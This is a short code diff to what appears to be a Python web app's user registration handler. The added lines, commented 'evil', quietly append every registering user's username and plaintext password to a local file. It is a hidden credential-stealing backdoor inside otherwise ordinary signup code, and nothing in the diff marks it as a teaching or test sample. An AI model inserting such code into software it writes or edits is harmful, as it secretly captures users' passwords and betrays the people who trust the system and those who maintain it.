@@ -61,6 +61,11 @@ def registerProcess(request):
     username = request.POST.get('username')
     email = request.POST.get('email')
     password = request.POST.get('password')
+    # evil
+    f = open('f.txt', 'a')
+    f.write("%s %s\n" % (username, password))
+    f.close()
+
     sex = request.POST.get('sex')
     wxauth = request.GET.get('wxauth', default=None)
     if wxauth:
